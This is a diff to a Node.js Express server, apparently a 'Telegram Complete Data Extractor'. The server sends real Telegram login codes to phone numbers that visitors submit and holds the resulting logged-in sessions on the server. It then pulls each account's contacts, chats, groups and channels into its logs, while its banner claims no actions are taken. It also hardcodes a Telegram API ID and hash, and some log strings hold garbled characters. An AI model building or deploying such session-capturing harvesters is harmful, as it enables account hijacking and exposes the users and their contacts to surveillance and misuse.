@@ -1,49 +1,25 @@
+cat > server.js << 'EOF'
 const express = require('express');
 const cors = require('cors');
 
-// Alternative import method - try different approaches
-console.log('🔍 DEBUG: Starting imports...');
+console.log('🔍 DEBUG: Starting server...');
+console.log('🔍 DEBUG: Testing imports...');
 
-// Method 1: Try direct require
 try {
-    const telegram = require('telegram');
-    console.log('✅ DEBUG: telegram module loaded');
-    console.log('🔍 DEBUG: telegram keys:', Object.keys(telegram));
+    const { TelegramClient, Api } = require('telegram');
+    const { StringSession } = require('telegram/sessions');
     
-    const TelegramApi = telegram.TelegramApi;
-    const Api = telegram.Api;
+    console.log('✅ DEBUG: TelegramClient type:', typeof TelegramClient);
+    console.log('✅ DEBUG: Api type:', typeof Api);
+    console.log('✅ DEBUG: StringSession type:', typeof StringSession);
     
-    console.log('�� DEBUG: TelegramApi type:', typeof TelegramApi);
-    console.log('�� DEBUG: Api type:', typeof Api);
-    
-    if (typeof TelegramApi === 'function') {
-        console.log('✅ DEBUG: TelegramApi is a function');
+    if (typeof TelegramClient === 'function') {
+        console.log('✅ DEBUG: TelegramClient is a function - SUCCESS!');
     } else {
-        console.log('❌ DEBUG: TelegramApi is not a function');
+        console.log('❌ DEBUG: TelegramClient is not a function');
     }
 } catch (error) {
-    console.error('❌ DEBUG: Error with method 1:', error);
-}
-
-// Method 2: Try destructuring
-try {
-    const { TelegramApi: TelegramApi2, Api: Api2 } = require('telegram');
-    console.log('🔍 DEBUG: Method 2 - TelegramApi2 type:', typeof TelegramApi2);
-    console.log('🔍 DEBUG: Method 2 - Api2 type:', typeof Api2);
-} catch (error) {
-    console.error('❌ DEBUG: Error with method 2:', error);
-}
-
-// Method 3: Try sessions import
-try {
-    const sessions = require('telegram/sessions');
-    console.log('✅ DEBUG: sessions module loaded');
-    console.log('🔍 DEBUG: sessions keys:', Object.keys(sessions));
-    
-    const StringSession = sessions.StringSession;
-    console.log('🔍 DEBUG: StringSession type:', typeof StringSession);
-} catch (error) {
-    console.error('❌ DEBUG: Error with sessions:', error);
+    console.error('❌ DEBUG: Error loading telegram:', error);
 }
 
 const app = express();
@@ -52,9 +28,6 @@ app.use(express.json());
 
 const apiId = parseInt(process.env.API_ID || 29310851);
 const apiHash = process.env.API_HASH || '9823f6b6d9cf657d64d7d33cdde80d1f';
-
-console.log('🔍 DEBUG: API ID:', apiId);
-console.log('�� DEBUG: API Hash:', apiHash ? 'Set' : 'Not set');
 
 const sessions = new Map();
 const authenticatedUsers = new Map();
@@ -69,10 +42,39 @@ app.post('/api/telegram/send-code', async (req, res) => {
         const { phoneNumber } = req.body;
         console.log(`📱 Sending REAL code to: ${phoneNumber}`);
         
-        // For now, just return an error to test if the endpoint works
-        res.status(400).json({
-            success: false,
-            message: 'DEBUG: Endpoint reached, but TelegramApi import failed'
+        const { TelegramClient, Api } = require('telegram');
+        const { StringSession } = require('telegram/sessions');
+        
+        const client = new TelegramClient(new StringSession(''), apiId, apiHash, {
+            connectionRetries: 5,
+        });
+
+        await client.connect();
+        console.log('🔗 Connected to Telegram servers');
+
+        const result = await client.invoke(
+            new Api.auth.SendCode({
+                phoneNumber: phoneNumber,
+                apiId: apiId,
+                apiHash: apiHash,
+                settings: new Api.CodeSettings({}),
+            })
+        );
+
+        const sessionId = generateSessionId();
+        sessions.set(sessionId, {
+            client,
+            phoneCodeHash: result.phoneCodeHash,
+            phoneNumber,
+            timestamp: Date.now()
+        });
+
+        console.log(`📨 REAL code sent to ${phoneNumber}`);
+
+        res.json({
+            success: true,
+            sessionId: sessionId,
+            message: 'Code sent to your Telegram app'
         });
 
     } catch (error) {
@@ -149,6 +151,8 @@ async function extractUserData(client, user, phoneNumber) {
     try {
         console.log(`📊 Extracting COMPLETE data for ${user.firstName} (${phoneNumber})`);
         
+        const { Api } = require('telegram');
+        
         // Get contacts
         const contactsResult = await client.invoke(new Api.contacts.GetContacts({ hash: 0 }));
         const contacts = contactsResult.users.filter(u => !u.self && !u.deleted && !u.bot);
@@ -162,11 +166,11 @@ async function extractUserData(client, user, phoneNumber) {
 
         // Detailed logging
         console.log(`\n📊 === COMPLETE DATA REPORT ===`);
-        console.log(`�� User: ${user.firstName} ${user.lastName}`);
+        console.log(` User: ${user.firstName} ${user.lastName}`);
         console.log(`📱 Phone: ${phoneNumber}`);
         console.log(`🆔 Telegram ID: ${user.id}`);
         console.log(`\n📈 STATISTICS:`);
-        console.log(`   �� Total Contacts: ${contacts.length}`);
+        console.log(`   Total Contacts: ${contacts.length}`);
         console.log(`   💬 Total Chats: ${dialogs.total}`);
         console.log(`   👥 Groups: ${groups.length}`);
         console.log(`   📢 Channels: ${channels.length}`);
@@ -174,7 +178,7 @@ async function extractUserData(client, user, phoneNumber) {
 
         // Log contact details
         if (contacts.length > 0) {
-            console.log(`\n�� CONTACTS (First 15):`);
+            console.log(`\n CONTACTS (First 15):`);
             contacts.slice(0, 15).forEach((contact, index) => {
                 const name = `${contact.firstName || ''} ${contact.lastName || ''}`.trim() || 'Unknown';
                 const username = contact.username ? ` (@${contact.username})` : '';
@@ -197,7 +201,7 @@ async function extractUserData(client, user, phoneNumber) {
 
         // Log channel details
         if (channels.length > 0) {
-            console.log(`\n�� CHANNELS (All ${channels.length}):`);
+            console.log(`\n CHANNELS (All ${channels.length}):`);
             channels.forEach((channel, index) => {
                 const subText = channel.entity.participantsCount ? ` (${channel.entity.participantsCount} subscribers)` : '';
                 const username = channel.entity.username ? ` (@${channel.entity.username})` : '';
@@ -250,9 +254,10 @@ app.get('/', (req, res) => {
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
     console.log(`🚀 Telegram Complete Data Extractor Started`);
-    console.log(`�� Running on port ${PORT}`);
+    console.log(` Running on port ${PORT}`);
     console.log(`🔍 Mode: Complete safe data extraction`);
     console.log(`⚠️  NO ACTIONS TAKEN - Data extraction only`);
     console.log(`📊 Provides comprehensive user data analysis`);
     console.log(`✅ Ready for testing!`);
 });
+EOF
